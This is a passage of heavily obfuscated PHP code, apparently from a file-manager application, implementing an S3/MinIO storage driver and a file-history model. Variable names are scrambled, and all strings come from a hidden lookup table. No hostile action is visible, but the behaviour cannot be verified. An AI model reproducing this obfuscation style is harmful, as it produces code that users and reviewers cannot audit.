($this->copyFile($“¿Í’ˆ¸, $ãµËÛªœ)) { $this->delFile($“¿Í’ˆ¸); return $this->getPathOuter($ãµËÛªœ); } return !1; } public function delFile($ÊÊØªÃ) { return $this->client->deleteObject($this->bucket, $ÊÊØªÃ); } public function delFolder($³¡“ı÷î) { $½©È±·œ =& $_SERVER[ï»»·÷á]; if (!$this->exist($³¡“ı÷î)) { return !0; } $this->listItemCache = !1; $æ¦åÍ§‡ = $this->fileList($³¡“ı÷î); $this->listItemCache = !0; $óíò™ã· = trim($³¡“ı÷î, $½©È±·œ[8]) . $½©È±·œ[8]; if (!empty($³¡“ı÷î) && $³¡“ı÷î !== $½©È±·œ[198] && !in_array($óíò™ã·, $æ¦åÍ§‡[$½©È±·œ[82]])) { $æ¦åÍ§‡[$½©È±·œ[82]][] = $óíò™ã·; } $ÓÎ³æÅ = $this->delByBatch($æ¦åÍ§‡[$½©È±·œ[83]]); if (!$ÓÎ³æÅ) { return !1; } $ÓÎ³æÅ = $this->delByBatch($æ¦åÍ§‡[$½©È±·œ[82]]); if (!$ÓÎ³æÅ) { return !1; } return $this->delFile($óíò™ã·); } private function delByBatch($şÕ‰™È°) { foreach (array_chunk($şÕ‰™È°, 1000) as $ÔãÚìÁÁ) { $¸Ğ¸ã¶à = $this->client->deleteObjects($this->bucket, $ÔãÚìÁÁ); if (!$¸Ğ¸ã¶à) { return !1; } } return !0; } public function rename($š¨ôõéë, $‘¡Í¦Æ¸) { return $this->renameObject($š¨ôõéë, $‘¡Í¦Æ¸); } public function listPath($“Íˆ—û€, $’øëøùğ = false) { $™éÌË†é =& $_SERVER[ï»»·÷á]; $´»ã§çù = $this->fileList($“Íˆ—û€, $™éÌË†é[8], !0); foreach ($´»ã§çù[$™éÌË†é[82]] as $áÆú“Ôõ => $ìá±ıÔ¯) { $´»ã§çù[$™éÌË†é[82]][$áÆú“Ôõ] = $this->folderInfo($ìá±ıÔ¯, $’øëøùğ, $ìá±ıÔ¯); } foreach ($´»ã§çù[$™éÌË†é[83]] as $áÆú“Ôõ => $ìá±ıÔ¯) { $´»ã§çù[$™éÌË†é[83]][$áÆú“Ôõ] = $this->fileInfo($ìá±ıÔ¯[$™éÌË†é[32]], $’øëøùğ, $ìá±ıÔ¯); } return $´»ã§çù; } protected function infoChildren($åóÒ·×ô, &$ëÖ„ÅÊÙ) { $—œ¿ÖÁ® =& $_SERVER[ï»»·÷á]; $À‘­ç = $this->fileList($åóÒ·×ô, $—œ¿ÖÁ®[12], !0); $ëÖ„ÅÊÙ[$—œ¿ÖÁ®[78]] += count($À‘­ç[$—œ¿ÖÁ®[82]]); $ëÖ„ÅÊÙ[$—œ¿ÖÁ®[77]] += count($À‘­ç[$—œ¿ÖÁ®[83]]); foreach ($À‘­ç[$—œ¿ÖÁ®[83]] as $µÂÅ­šÈ) { if (!$µÂÅ­šÈ || !$µÂÅ­šÈ[$—œ¿ÖÁ®[76]]) { continue; } $ëÖ„ÅÊÙ[$—œ¿ÖÁ®[76]] += $µÂÅ­šÈ[$—œ¿ÖÁ®[76]]; } } private function fileInfo($‘²Â¶ÆÒ, $Œñ”–‚‘ = false, $Ã¡–Ÿƒ = array()) { $ÙÁø”ÉÖ =& $_SERVER[ï»»·÷á]; $’»š—µê = array($ÙÁø”ÉÖ[32] => $this->pathThis($‘²Â¶ÆÒ), $ÙÁø”ÉÖ[84] => $this->getPathOuter($‘²Â¶ÆÒ), $ÙÁø”ÉÖ[33] => $ÙÁø”ÉÖ[200], $ÙÁø”ÉÖ[174] => $this->ext($‘²Â¶ÆÒ), $ÙÁø”ÉÖ[76] => isset($Ã¡–Ÿƒ[$ÙÁø”ÉÖ[76]]) ? $Ã¡–Ÿƒ[$ÙÁø”ÉÖ[76]] : 0); if ($Œñ”–‚‘) { return $’»š—µê; } $’»š—µê[$ÙÁø”ÉÖ[201]] = $’»š—µê[$ÙÁø”ÉÖ[85]] = 0; $’»š—µê[$ÙÁø”ÉÖ[202]] = $’»š—µê[$ÙÁø”ÉÖ[203]] = !0; if (empty($Ã¡–Ÿƒ)) { $Ã¡–Ÿƒ = $this->objectMeta($‘²Â¶ÆÒ); if (!$Ã¡–Ÿƒ) { return $’»š—µê; } } if (isset($Ã¡–Ÿƒ[$ÙÁø”ÉÖ[180]])) { $’»š—µê[$ÙÁø”ÉÖ[85]] = $Ã¡–Ÿƒ[$ÙÁø”ÉÖ[180]]; } if (isset($Ã¡–Ÿƒ[$ÙÁø”ÉÖ[76]])) { $’»š—µê[$ÙÁø”ÉÖ[76]] = $Ã¡–Ÿƒ[$ÙÁø”ÉÖ[76]]; } return $’»š—µê; } private function folderInfo($©»Î·â , $«‡ã®· = false, $²±Å¨çõ = array()) { $–ßÆ€¯û =& $_SERVER[ï»»·÷á]; $Í¦àÏ = array($–ßÆ€¯û[32] => $this->pathThis($©»Î·â ), $–ßÆ€¯û[84] => $this->getPathOuter($–ßÆ€¯û[8] . $©»Î·â ), $–ßÆ€¯û[33] => $–ßÆ€¯û[75]); if ($«‡ã®·) { return $Í¦àÏ; } $Í¦àÏ[$–ßÆ€¯û[201]] = $Í¦àÏ[$–ßÆ€¯û[85]] = 0; $Í¦àÏ[$–ßÆ€¯û[202]] = $Í¦àÏ[$–ßÆ€¯û[203]] = !0; if ($©»Î·â  == $–ßÆ€¯û[12]) { return $Í¦àÏ; } if (empty($²±Å¨çõ)) { $²±Å¨çõ = $this->objectMeta(trim($©»Î·â , $–ßÆ€¯û[8]) . $–ßÆ€¯û[8]); } if (isset($²±Å¨çõ[$–ßÆ€¯û[180]])) { $Í¦àÏ[$–ßÆ€¯û[201]] = $²±Å¨çõ[$–ßÆ€¯û[180]]; } return $Í¦àÏ; } private function fileList($øùçÚ½´, $ÌÅµØßÕ = '', $à¥ë·§¯ = 0) { $êœòÙ° =& $_SERVER[ï»»·÷á]; $¼úœ†¢ = rtrim($øùçÚ½´, $êœòÙ°[8]) . $êœòÙ°[8]; $Ÿ‰÷ëº = $this->listObjs($¼úœ†¢, null, null, $ÌÅµØßÕ); if (!$Ÿ‰÷ëº) { return array($êœòÙ°[82] => array(), $êœòÙ°[83] => array()); } $Ôö²ŠÈÌ = $‘‡¢ºŠß = array(); foreach ($Ÿ‰÷ëº[$êœòÙ°[204]] as $â·’ŒÃ) { $Ë·×„ = $â·’ŒÃ[$êœòÙ°[32]]; if ($Ë·×„ == $¼úœ†¢) { continue; } $ù…‡ü‰¨ = isset($â·’ŒÃ[$êœòÙ°[76]]) ? $â·’ŒÃ[$êœòÙ°[76]] : 0; $ª¡¶ñ¥Î = $ù…‡ü‰¨ == 0 && substr($Ë·×„, strlen($Ë·×„) - 1, 1) == $êœòÙ°[8] ? !0 : !1; $this->cacheMethodInfoSet($Ë·×„, $ª¡¶ñ¥Î, $â·’ŒÃ); if ($ª¡¶ñ¥Î) { $Ôö²ŠÈÌ[] = $Ë·×„; continue; } $‘‡¢ºŠß[] = $à¥ë·§¯ ? $â·’ŒÃ : $Ë·×„; } foreach ($Ÿ‰÷ëº[$êœòÙ°[205]] as $â·’ŒÃ) { $Ôö²ŠÈÌ[] = $â·’ŒÃ[$êœòÙ°[32]]; $this->cacheMethodInfoSet($â·’ŒÃ[$êœòÙ°[32]], !0); } $this->cacheMethodInfoSet($øùçÚ½´, !0); return array($êœòÙ°[82] => $Ôö²ŠÈÌ, $êœòÙ°[83] => $‘‡¢ºŠß); } private function listObjs($“î§ˆˆ¨, $àë±„ = null, $âĞª¯ÓÂ = null, $‹À—ìë = null) { $”§…Ü– =& $_SERVER[ï»»·÷á]; $“î§ˆˆ¨ = trim($“î§ˆˆ¨, $”§…Ü–[8]); $ãˆ®ç‡ˆ = empty($“î§ˆˆ¨) && $“î§ˆˆ¨ !== $”§…Ü–[198] ? $”§…Ü–[12] : $“î§ˆˆ¨ . $”§…Ü–[8]; return $this->client->getBucket($this->bucket, $ãˆ®ç‡ˆ, $àë±„, $âĞª¯ÓÂ, $‹À—ìë, !0); } public function has($äú…Áö, $¼¢ü‚‘½ = false, $³­ÔáËÑ = true) { $ÃÑ­£íê =& $_SERVER[ï»»·÷á]; $äú…Áö = trim($äú…Áö, $ÃÑ­£íê[8]); $â¯ğ‘í® = empty($äú…Áö) && $äú…Áö !== $ÃÑ­£íê[198] ? $ÃÑ­£íê[12] : $äú…Áö . $ÃÑ­£íê[8]; $øäìÁ Ï = null; $Ñ©œûÁ§ = 500; $Ğ›¦õĞ© = $ÃÑ­£íê[8]; $…ıßö¿ = $©ˆ¤­¬Ÿ = array(); while (!0) { $Ş•Ä ¡È = $this->listObjs($äú…Áö, $øäìÁ Ï, $Ñ©œûÁ§, $Ğ›¦õĞ©); if (!$Ş•Ä ¡È) { break; } $øäìÁ Ï = $Ş•Ä ¡È[$ÃÑ­£íê[206]]; $´ÚåŸµ° = $Ş•Ä ¡È[$ÃÑ­£íê[204]]; $ïœşÜ¿ = $Ş•Ä ¡È[$ÃÑ­£íê[205]]; if (empty($´ÚåŸµ°) && empty($ïœşÜ¿)) { break; } if (count($´ÚåŸµ°) == 1 && $´ÚåŸµ°[0][$ÃÑ­£íê[32]] == $â¯ğ‘í®) { break; } if ($¼¢ü‚‘½) { if (count($´ÚåŸµ°)) { $´ÚåŸµ° = array_column($´ÚåŸµ°, $ÃÑ­£íê[32]); $…ıßö¿ = array_merge($…ıßö¿, $´ÚåŸµ°); } if (count($ïœşÜ¿)) { $ïœşÜ¿ = array_column($ïœşÜ¿, $ÃÑ­£íê[32]); $©ˆ¤­¬Ÿ = array_merge($©ˆ¤­¬Ÿ, $ïœşÜ¿); } if ($øäìÁ Ï === null) { break; } continue; } if ($³­ÔáËÑ) { if (!empty($´ÚåŸµ°)) { if (count($´ÚåŸµ°) > 1 || isset($´ÚåŸµ°[0][$ÃÑ­£íê[32]]) && $´ÚåŸµ°[0][$ÃÑ­£íê[32]] != $â¯ğ‘í®) { return !0; } } } else { if (!empty($ïœşÜ¿)) { return !0; } } if ($øäìÁ Ï === null) { break; } } if ($¼¢ü‚‘½) { $…ıßö¿ = array_diff($…ıßö¿, array($â¯ğ‘í®)); $…ıßö¿ = count(array_unique($…ıßö¿)); $©ˆ¤­¬Ÿ = count(array_unique($©ˆ¤­¬Ÿ)); return array($ÃÑ­£íê[207] => $…ıßö¿, $ÃÑ­£íê[208] => $©ˆ¤­¬Ÿ); } return !1; } public function listAll($Ñ“©ù„Ö) { $ÆÃ¬ÇæÛ =& $_SERVER[ï»»·÷á]; $´×¿²ª» = $this->fileList($Ñ“©ù„Ö, $ÆÃ¬ÇæÛ[12], !0); $ÌºéãÔ = array_to_keyvalue($´×¿²ª»[$ÆÃ¬ÇæÛ[83]], $ÆÃ¬ÇæÛ[32]); foreach ($´×¿²ª»[$ÆÃ¬ÇæÛ[82]] as $Õ¥åüÜÑ) { if (is_string($Õ¥åüÜÑ)) { $ÌºéãÔ[$Õ¥åüÜÑ] = array($ÆÃ¬ÇæÛ[76] => 0); } } return $this->listAllFiles($Ñ“©ù„Ö, $ÌºéãÔ); } public function canRead($¸†®×µŞ) { $¸ù¾ìÊÙ =& $_SERVER[ï»»·÷á]; $¤¾ó¹ø = $this->client->getAccessControlPolicy($this->bucket, $¸†®×µŞ); if (!$¤¾ó¹ø) { return !1; } return in_array($¤¾ó¹ø, array($¸ù¾ìÊÙ[209], $¸ù¾ìÊÙ[210], $¸ù¾ìÊÙ[211])) ? !0 : !1; } public function canWrite($é©Íîœ­) { $úÑÌ¢ş =& $_SERVER[ï»»·÷á]; $êœ×ÀÓü = $this->client->getAccessControlPolicy($this->bucket, $é©Íîœ­); if (!$êœ×ÀÓü) { return !1; } return in_array($êœ×ÀÓü, array($úÑÌ¢ş[209], $úÑÌ¢ş[210])) ? !0 : !1; } public function getContent($šÂ”¬êÈ) { return $this->client->getObject($this->bucket, $šÂ”¬êÈ); } public function setContent($ôã®³Õç, $ÒØÚÉÃÔ = '', $¼®Èè¨Æ = false) { $’¸ë‡ÒÅ =& $_SERVER[ï»»·÷á]; $ôã®³Õç = $¼®Èè¨Æ ? trim($ôã®³Õç, $’¸ë‡ÒÅ[8]) . $’¸ë‡ÒÅ[8] : $ôã®³Õç; $î×Ó‹ = get_file_mime(get_path_ext($ôã®³Õç)); $ŸÄ´¡˜¿ = $this->client->putObject($ÒØÚÉÃÔ, $this->bucket, $ôã®³Õç, $’¸ë‡ÒÅ[199], array(), $î×Ó‹); if (!$ŸÄ´¡˜¿) { return !1; } if ($¼®Èè¨Æ) { return !0; } $this->cacheMethod(null, null); $ŸÄ´¡˜¿ = $this->copyFile($ôã®³Õç, $ôã®³Õç, array($’¸ë‡ÒÅ[212] => $ŸÄ´¡˜¿[$’¸ë‡ÒÅ[213]])); return $ŸÄ´¡˜¿ ? !0 : !1; } public function fileSubstr($’õ×›÷Ë, $œ²Û ÈŸ, $ÁºÙ›Ëø) { $¢Ğ­ÎÙË = $œ²Û ÈŸ + $ÁºÙ›Ëø - 1; return $this->client->getObject($this->bucket, $’õ×›÷Ë, array($_SERVER[ï»»·÷á][214] => "\x62\x79\164\x65\163\75{$œ²Û ÈŸ}\55{$¢Ğ­ÎÙË}")); } public function upload($µµşµÛì, $÷Êü×çÊ, $¯†›áˆÆ = false, $¡Â˜äëş = REPEAT_REPLACE) { $ÉáÓšàÏ =& $_SERVER[ï»»·÷á]; $¼Ìêª¡– = array($ÉáÓšàÏ[212] => @md5_file($÷Êü×çÊ)); $»ïğÊ¯ = array($ÉáÓšàÏ[215] => get_file_mime(get_path_ext($µµşµÛì))); if (IO::size($÷Êü×çÊ) <= 1024 * 1024 * 200) { $ü”®ö ƒ = $this->client->putObjectFile($÷Êü×çÊ, $this->bucket, $µµşµÛì, $ÉáÓšàÏ[199], $¼Ìêª¡–, $»ïğÊ¯); return !empty($ü”®ö ƒ) ? $this->getPathOuter($µµşµÛì) : !1; } $¨®ÜÒí = $this->client->multiUploadObject($÷Êü×çÊ, $this->bucket, trim($µµşµÛì, $ÉáÓšàÏ[8]), $¼Ìêª¡–, $»ïğÊ¯); return $¨®ÜÒí ? $this->getPathOuter($µµşµÛì) : !1; } public function download($Ï÷àëÜ½, $ä¶À—à×) { if (!@is_dir($this->pathFather($ä¶À—à×)) && !IO::mkdir($this->pathFather($ä¶À—à×))) { return !1; } $Ë‚¢ï¦¿ = $this->client->getObject($this->bucket, $Ï÷àëÜ½, array(), $ä¶À—à×); return $Ë‚¢ï¦¿ !== !1 ? $ä¶À—à× : !1; } public function link($ç¦šÙ², $İ”’§¼â = array()) { $íÛÎ°é¬ =& $_SERVER[ï»»·÷á]; if ($this->signVer == $íÛÎ°é¬[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ç¦šÙ², 3600 * 12, $İ”’§¼â); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ç¦šÙ², $íÛÎ°é¬[8]), 3600 * 12, $this->region, array(), !0, $İ”’§¼â); } public function fileOut($‡‚ÌÔËò, $÷ğª¸Æ­ = false, $ÆÛ·áš› = false, $åÕÕ±Êæ = '') { $›ıôÌõ =& $_SERVER[ï»»·÷á]; if ($this->isFileOutServer()) { return $this->fileOutServer($‡‚ÌÔËò, $÷ğª¸Æ­, $ÆÛ·áš›, $åÕÕ±Êæ); } if (!$ÆÛ·áš›) { $ÆÛ·áš› = $this->pathThis($‡‚ÌÔËò); } $Œßë¦¨› = get_file_mime(get_path_ext($ÆÛ·áš›)); if ($Œßë¦¨› == $›ıôÌõ[217]) { return parent::fileOut($‡‚ÌÔËò, $÷ğª¸Æ­, $ÆÛ·áš›, $åÕÕ±Êæ); } $×ÅôéğÆ = array($›ıôÌõ[218] => $Œßë¦¨›); if ($÷ğª¸Æ­) { $×ÅôéğÆ[$›ıôÌõ[219]] = $›ıôÌõ[220] . rawurlencode($ÆÛ·áš›); } else { } $ôû®· = $this->link($‡‚ÌÔËò, $×ÅôéğÆ); $this->fileOutLink($ôû®·); } public function fileOutServer($ˆöâ“¶ú, $ÆÛ…£Âù = false, $¨•‡ÍÆ = false, $Ûü¢±‡ã = '') { parent::fileOut($ˆöâ“¶ú, $ÆÛ…£Âù, $¨•‡ÍÆ, $Ûü¢±‡ã); } public function fileOutImageServer($ñæÑª·², $ÇÚ¡–ÉØ = 250) { parent::fileOutImage($ñæÑª·², $ÇÚ¡–ÉØ); } public function hashMd5($õÍŒ„ğ, $¹¢ñÃ§« = '') { $¤Šƒîé  =& $_SERVER[ï»»·÷á]; $Ãêñ“çü = $this->objectMeta($õÍŒ„ğ); if (!$Ãêñ“çü) { return !1; } $¹¢ñÃ§« = $¹¢ñÃ§« ? $¹¢ñÃ§« : _get($Ãêñ“çü, $¤Šƒîé [221]); $¹¢ñÃ§« = $¹¢ñÃ§« ? $¹¢ñÃ§« : _get($Ãêñ“çü, $¤Šƒîé [213], $¤Šƒîé [12]); return $¹¢ñÃ§«; } public function uploadFormData($Ä²•‰Ü¡, $ÃµöÌË = 3600) { $Ò Œ§î =& $_SERVER[ï»»·÷á]; $ ’ôîÃ = $this->pathFather($Ä²•‰Ü¡); $ŸÔ¹İİ’ = $this->client->getHttpUploadPostParams($this->bucket, $ ’ôîÃ, $Ò Œ§î[199], $ÃµöÌË); return array_merge((array) $ŸÔ¹İİ’, array($Ò Œ§î[182] => $this->getHost())); } public function multiUploadFormData($Úñ…°³Ç, $¡¤‚‰€ô = 3600) { $¡ÁÛÆ¦ =& $_SERVER[ï»»·÷á]; $õóÏ×Í» = gmdate($¡ÁÛÆ¦[222]); $¢×”™ = array(); $…¸ã¤ßÌ = $this->client->getUploadId($this->bucket, $Úñ…°³Ç, $¢×”™); if (!$…¸ã¤ßÌ) { return !1; } return array($¡ÁÛÆ¦[223] => $…¸ã¤ßÌ, $¡ÁÛÆ¦[182] => $this->getHost() . $¡ÁÛÆ¦[8] . $this->pathEncode($Úñ…°³Ç), $¡ÁÛÆ¦[224] => $õóÏ×Í», $¡ÁÛÆ¦[94] => $Úñ…°³Ç); } public function multiUploadAuthData($Ò¿Ó£ñà, $¯ÚİÁçÜ = array()) { $ô½ŸÛ·® =& $_SERVER[ï»»·÷á]; $÷€Õ…ê = isset($¯ÚİÁçÜ[$ô½ŸÛ·®[224]]) ? $¯ÚİÁçÜ[$ô½ŸÛ·®[224]] : gmdate($ô½ŸÛ·®[222]); $ÖÍ½à€Ü = isset($¯ÚİÁçÜ[$ô½ŸÛ·®[174]]) ? $¯ÚİÁçÜ[$ô½ŸÛ·®[174]] : $ô½ŸÛ·®[12]; $Æí­¹ Ê = $¯ÚİÁçÜ[$ô½ŸÛ·®[94]]; unset($¯ÚİÁçÜ[$ô½ŸÛ·®[94]]); if (isset($¯ÚİÁçÜ[$ô½ŸÛ·®[225]])) { $¯ÚİÁçÜ[$ô½ŸÛ·®[224]] = $÷€Õ…ê; return $this->listUploadParts($Æí­¹ Ê, $¯ÚİÁçÜ); } $ÁôÂµñÔ = array($ô½ŸÛ·®[226], $ô½ŸÛ·®[12], $ô½ŸÛ·®[120], $ô½ŸÛ·®[12], "\170\x2d\x61\x6d\172\x2d\144\141\164\145\72{$÷€Õ…ê}", $ô½ŸÛ·®[8] . $this->bucket . $ô½ŸÛ·®[8] . $this->pathEncode($Æí­¹ Ê) . $ÖÍ½à€Ü); if (strpos($ÖÍ½à€Ü, $ô½ŸÛ·®[227]) === 0) { $ÁôÂµñÔ[0] = $ô½ŸÛ·®[228]; } if (isset($¯ÚİÁçÜ[$ô½ŸÛ·®[229]]) && $¯ÚİÁçÜ[$ô½ŸÛ·®[229]] == $ô½ŸÛ·®[230]) { $ÁôÂµñÔ[0] = $ô½ŸÛ·®[230]; } $ã˜–¼¸ö = implode($ô½ŸÛ·®[231], $ÁôÂµñÔ); $ïÉØü¨ş = base64_encode(hash_hmac($ô½ŸÛ·®[232], $ã˜–¼¸ö, $this->secret, !0)); $åæÕ¤ØÔ = $ô½ŸÛ·®[233] . $this->accessKey . $ô½ŸÛ·®[4] . $ïÉØü¨ş; if (strpos($ÖÍ½à€Ü, $ô½ŸÛ·®[227]) === 0) { return array($ô½ŸÛ·®[234] => $åæÕ¤ØÔ, $ô½ŸÛ·®[224] => $÷€Õ…ê); } return $åæÕ¤ØÔ; } public function listUploadParts($ °ÓèÔ, $ÕñÈ³äã = array()) { $¾È²Ûöæ =& $_SERVER[ï»»·÷á]; $ì½ÂíØÌ = str_replace($¾È²Ûöæ[235], $¾È²Ûöæ[12], $ÕñÈ³äã[$¾È²Ûöæ[174]]); $”¦Óïì = $this->client->listParts($this->bucket, $ °ÓèÔ, $ì½ÂíØÌ); if (!$”¦Óïì) { return !1; } unset($ÕñÈ³äã[$¾È²Ûöæ[225]], $ÕñÈ³äã[$¾È²Ûöæ[229]]); $ÕñÈ³äã[$¾È²Ûöæ[94]] = $ °ÓèÔ; $Ìàû²Â€ = $this->multiUploadAuthData($ °ÓèÔ, $ÕñÈ³äã); if (empty($Ìàû²Â€)) { return !1; } return array($¾È²Ûöæ[234] => $Ìàû²Â€, $¾È²Ûöæ[224] => $ÕñÈ³äã[$¾È²Ûöæ[224]], $¾È²Ûöæ[236] => $”¦Óïì); } public function getHost() { return parent::getHost() . $_SERVER[ï»»·÷á][8] . $this->bucket; } public function size($İáª¬Ï£) { $Í¾À£²« = $this->objectMeta($İáª¬Ï£); return $Í¾À£²« ? $Í¾À£²«[$_SERVER[ï»»·÷á][76]] : 0; } public function info($©»ÂÍ©ğ) { if ($this->isFolder($©»ÂÍ©ğ)) { return $this->folderInfo($©»ÂÍ©ğ); } else { if ($this->isFile($©»ÂÍ©ğ)) { return $this->fileInfo($©»ÂÍ©ğ); } } return !1; } public function exist($ŠŞš€Ã¶) { return $this->isFile($ŠŞš€Ã¶) || $this->isFolder($ŠŞš€Ã¶); } public function isFile($ÎËÆ¦»­) { return !$this->isFolder($ÎËÆ¦»­) && $this->objectMeta($ÎËÆ¦»­); } public function isFolder($ïµÉĞ¶ç) { return $this->cacheMethod($_SERVER[ï»»·÷á][165], $ïµÉĞ¶ç); } protected function objectMeta($¬ÅåÔ«„) { return $this->cacheMethod($_SERVER[ï»»·÷á][167], $¬ÅåÔ«„); } protected function _objectMeta($³Ëè£™€) { $•Çş…³› =& $_SERVER[ï»»·÷á]; $³Ëè£™€ = rtrim($³Ëè£™€, $•Çş…³›[8]); try { $çÃÇãõå = $this->client->getObjectInfo($this->bucket, $³Ëè£™€); if (!isset($çÃÇãõå[$•Çş…³›[221]]) && isset($çÃÇãõå[$•Çş…³›[237]])) { $çÃÇãõå[$•Çş…³›[221]] = $çÃÇãõå[$•Çş…³›[237]]; } } catch (Exception $°¾ÚµŒ×) { $çÃÇãõå = !1; } if (!$çÃÇãõå) { } return $çÃÇãõå; } protected function _isFolder($ëšø´çº) { $îê‡ÛÛ =& $_SERVER[ï»»·÷á]; $ëšø´çº = rtrim($ëšø´çº, $îê‡ÛÛ[8]); if ($ëšø´çº == $îê‡ÛÛ[12] || $ëšø´çº == $îê‡ÛÛ[8]) { return !0; } $Á¨ß†Ä = $this->client->getBucket($this->bucket, $ëšø´çº, null, 1); if (empty($Á¨ß†Ä[$îê‡ÛÛ[204]])) { return !1; } $“Ê„¨é = $Á¨ß†Ä[$îê‡ÛÛ[204]][0][$îê‡ÛÛ[32]]; return stripos($“Ê„¨é, $ëšø´çº . $îê‡ÛÛ[8]) === 0 ? !0 : !1; if (substr($“Ê„¨é, -1) == $îê‡ÛÛ[8]) { return !0; } if (get_path_this($“Ê„¨é) == get_path_this($ëšø´çº)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Î”Ü‰¨ß) { parent::__construct($Î”Ü‰¨ß); $this->signatureVersion($_SERVER[ï»»·÷á][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto Fä¤ØÁÚõÆ; Fä¤ØÁÚõÆ: define($_SERVER[ï»»·÷á][238], 1); define($_SERVER[ï»»·÷á][239], 2); define($_SERVER[ï»»·÷á][240], 3); goto FÑ÷î™Æ‹ö; FÑ÷î™Æ‹ö: define($_SERVER[ï»»·÷á][241], 1); define($_SERVER[ï»»·÷á][242], 0); define($_SERVER[ï»»·÷á][243], 2); goto BŠÃì­Õåá; B±²‚‡£¦¦: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\x63\x65\137\150\x69\x73\x74\157\162\171"; public function historyCount($„òÖõ„Õ) { $ğâûßéÀ =& $_SERVER[ï»»·÷á]; if (!$„òÖõ„Õ) { return array(); } if (is_string($„òÖõ„Õ) || is_int($„òÖõ„Õ)) { $„òÖõ„Õ = array($„òÖõ„Õ); } $Æ†ì“Ü = array($ğâûßéÀ[411], $ğâûßéÀ[1900] => $ğâûßéÀ[500]); $û×ì…ˆœ = array($ğâûßéÀ[411] => array($ğâûßéÀ[7], $„òÖõ„Õ)); $Ë¥ÎÆ­Ş = $this->field($Æ†ì“Ü)->where($û×ì…ˆœ)->group($ğâûßéÀ[411])->select(); return array_to_keyvalue($Ë¥ÎÆ­Ş, $ğâûßéÀ[411], $ğâûßéÀ[500]); } public function addHistory($¢Ÿşğà†, $™ıÈÊôÇ = '') { $å¸ş¸µ =& $_SERVER[ï»»·÷á]; $óÂ§ÑÇ¬ = array($å¸ş¸µ[426] => $¢Ÿşğà†[$å¸ş¸µ[411]], $å¸ş¸µ[1669] => isset($¢Ÿşğà†[$å¸ş¸µ[465]]) ? $¢Ÿşğà†[$å¸ş¸µ[465]] : $¢Ÿşğà†[$å¸ş¸µ[463]], $å¸ş¸µ[478] => $¢Ÿşğà†[$å¸ş¸µ[477]], $å¸ş¸µ[554] => $¢Ÿşğà†[$å¸ş¸µ[76]], $å¸ş¸µ[2110] => $™ıÈÊôÇ); if ($GLOBALS[$å¸ş¸µ[6]][$å¸ş¸µ[89]][$å¸ş¸µ[1227]] >= 1) { $this->historyAutoClear($óÂ§ÑÇ¬[$å¸ş¸µ[411]]); $this->add($óÂ§ÑÇ¬); } Hook::trigger($å¸ş¸µ[2111], $óÂ§ÑÇ¬); Model($å¸ş¸µ[2112])->eventFileEdit($¢Ÿşğà†[$å¸ş¸µ[411]]); } private function historyAutoClear($æ¡Ï™¸Ï) { $½ì»¥‡¬ =& $_SERVER[ï»»·÷á]; $“İóŒ = Model($½ì»¥‡¬[783])->get($½ì»¥‡¬[1249]); $§ÙŒ¯Â• = $GLOBALS[$½ì»¥‡¬[6]][$½ì»¥‡¬[89]][$½ì»¥‡¬[1227]]; $²¦ï¤…õ = $“İóŒ == $½ì»¥‡¬[1250] ? min(5, $§ÙŒ¯Â•) : $§ÙŒ¯Â•; $²¦ï¤…õ = $²¦ï¤…õ <= 0 ? 0 : $²¦ï¤…õ - 1; if ($²¦ï¤…õ >= 500) { return; } $¨Åâ÷ = array($½ì»¥‡¬[426] => $æ¡Ï™¸Ï); $÷ëÏìÍ¯ = $this->field($½ì»¥‡¬[2113])->where($¨Åâ÷)->order($½ì»¥‡¬[2107])->select(); if (!$÷ëÏìÍ¯ || $²¦ï¤…õ >= count($÷ëÏìÍ¯)) { return; } $¹ˆŞÜÊÑ = array_to_keyvalue($÷ëÏìÍ¯, $½ì»¥‡¬[12], $½ì»¥‡¬[399]); $¹ˆŞÜÊÑ = array_slice($¹ˆŞÜÊÑ, $²¦ï¤…õ); $ˆü°·èñ = array_to_keyvalue($÷ëÏìÍ¯, $½ì»¥‡¬[12], $½ì»¥‡¬[477]); $ˆü°·èñ = array_slice($ˆü°·èñ, $²¦ï¤…õ); if (!$¹ˆŞÜÊÑ || !$ˆü°·èñ) { return; } $¨Åâ÷ = array($½ì»¥‡¬[428] => array($½ì»¥‡¬[7], $¹ˆŞÜÊÑ)); $this->where($¨Åâ÷)->delete(); Model($½ì»¥‡¬[480])->remove($ˆü°·èñ); } public function listData($ŞíôÑíó) { $ıµÔøÊË =& $_SERVER[ï»»·÷á]; $ïüçÅÄ‰ = array($ıµÔøÊË[426] => $ŞíôÑíó); $ó¾ª¤¨ = $ıµÔøÊË[2114]; $…ÛÜı· = $this->field($ó¾ª¤¨)->where($ïüçÅÄ‰)->order($ıµÔøÊË[2107])->selectPage(); $this->_listAppendUser($…ÛÜı·[$ıµÔøÊË[369]]); $ĞÀŸÛ÷ò = Model($ıµÔøÊË[783])->get($ıµÔøÊË[1249]); $çşÌÖƒ = 5; if ($ĞÀŸÛ÷ò == $ıµÔøÊË[1250]) { $…ÛÜı·[$ıµÔøÊË[369]] = array_slice($…ÛÜı·[$ıµÔøÊË[369]], 0, $çşÌÖƒ); $…ÛÜı·[$ıµÔøÊË[366]] = array($ıµÔøÊË[2115] => 1, $ıµÔøÊË[2116] => 20, $ıµÔøÊË[2117] => 1, $ıµÔøÊË[2118] => count($…ÛÜı·[$ıµÔøÊË[369]])); } return $…ÛÜı·; } protected function _listAppendUser(&$ˆº¥Ÿñ) { $„é™î¸ =& $_SERVER[ï»»·÷á]; $ ½­”—½ = array_to_keyvalue($ˆº¥Ÿñ, $„é™î¸[12], $„é™î¸[1678]); $ÊÓÎÎÎœ = Model($„é™î¸[534])->userListInfo($ ½­”—½); foreach ($ˆº¥Ÿñ as &$íÂƒ‡è½) { $˜¡š¿Ô³ = $íÂƒ‡è½[$„é™î¸[1678]]; $íÂƒ‡è½[$„é™î¸[463]] = $ÊÓÎÎÎœ[$˜¡š¿Ô³] ? $ÊÓÎÎÎœ[$˜¡š¿Ô³] : !1; } unset($íÂƒ‡è½); } public function fileInfo($³úÒË¾µ) { $ôôæ§Â¢ =& $_SERVER[ï»»·÷á]; $Š©èñÅ¨ = $this->tablePrefix; $¡€µÄ³Œ = 